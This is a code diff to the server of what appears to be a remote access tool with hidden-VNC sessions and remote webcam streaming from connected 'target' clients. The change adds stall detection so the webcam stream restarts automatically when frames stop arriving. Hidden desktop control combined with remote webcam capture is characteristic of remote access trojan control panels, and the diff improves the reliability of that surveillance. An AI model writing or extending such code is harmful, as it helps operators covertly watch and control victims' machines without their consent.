@@ -780,7 +780,22 @@ function defaultHVNCStreamingState(): HVNCStreamingState {
 }
 
 export const hvncStreamingState = new Map<string, HVNCStreamingState>();
-export const webcamStreamingState = new Map<string, { isStreaming: boolean; deviceIndex: number; fps: number; useMax: boolean; quality: number; codec: string }>();
+type WebcamStreamingState = {
+  isStreaming: boolean;
+  deviceIndex: number;
+  fps: number;
+  useMax: boolean;
+  quality: number;
+  codec: string;
+  startedAt: number;
+  lastFrameAt: number;
+};
+
+function defaultWebcamStreamingState(): WebcamStreamingState {
+  return { isStreaming: false, deviceIndex: 0, fps: 30, useMax: false, quality: 90, codec: "", startedAt: 0, lastFrameAt: 0 };
+}
+
+export const webcamStreamingState = new Map<string, WebcamStreamingState>();
 
 export function handleWebcamViewerOpen(ws: ServerWebSocket<SocketData>) {
   const { clientId, userId, userRole } = ws.data;
@@ -971,7 +986,7 @@ export function handleWebcamViewerMessage(ws: ServerWebSocket<SocketData>, raw: 
     return;
   }
 
-  const state = webcamStreamingState.get(clientId) || { isStreaming: false, deviceIndex: 0, fps: 30, useMax: false, quality: 90, codec: "" };
+  const state = webcamStreamingState.get(clientId) || defaultWebcamStreamingState();
   switch (payload.type) {
     case "webcam_list":
       sendDesktopCommand(target, "webcam_list", {});
@@ -1000,8 +1015,11 @@ export function handleWebcamViewerMessage(ws: ServerWebSocket<SocketData>, raw: 
       sendDesktopCommand(target, "webcam_set_fps", { fps, useMax });
       break;
     }
-    case "webcam_start":
-      if (!state.isStreaming) {
+    case "webcam_start": {
+      const now = Date.now();
+      const staleWithoutFrames = state.isStreaming && state.lastFrameAt === 0 && now - state.startedAt >= 3000;
+      const stalled = state.isStreaming && state.lastFrameAt > 0 && now - state.lastFrameAt >= 5000;
+      if (!state.isStreaming || staleWithoutFrames || stalled) {
         sendDesktopCommand(target, "webcam_set_fps", { fps: state.fps, useMax: state.useMax });
         sendDesktopCommand(target, "webcam_set_quality", { quality: state.quality, codec: state.codec });
         if ((payload as any).webrtc === true) {
@@ -1024,9 +1042,12 @@ export function handleWebcamViewerMessage(ws: ServerWebSocket<SocketData>, raw: 
         safeSendViewer(ws, { type: "status", status: "starting" });
         sendDesktopCommand(target, "webcam_start", {});
         state.isStreaming = true;
+        state.startedAt = now;
+        state.lastFrameAt = 0;
         webcamStreamingState.set(clientId, state);
       }
       break;
+    }
     case "webcam_set_quality": {
       const quality = Math.max(0, Math.min(100, Number(payload.quality) || 0));
       const codec = String(payload.codec || "").toLowerCase();
@@ -1420,6 +1441,10 @@ export function sendHVNCCommand(target: ClientInfo, commandType: string, payload
 };
 
 (globalThis as any).__webcamBroadcast = (clientId: string, bytes: Uint8Array, header?: any): boolean => {
+  const state = webcamStreamingState.get(clientId) || defaultWebcamStreamingState();
+  state.isStreaming = true;
+  state.lastFrameAt = Date.now();
+  webcamStreamingState.set(clientId, state);
   const buf = buildViewerFrameBuffer(bytes, header);
   const result = broadcastFrameToViewers(sessionManager.getWebcamSessionsForClient(clientId), buf, header);
   return result.sent || result.viewers === 0;
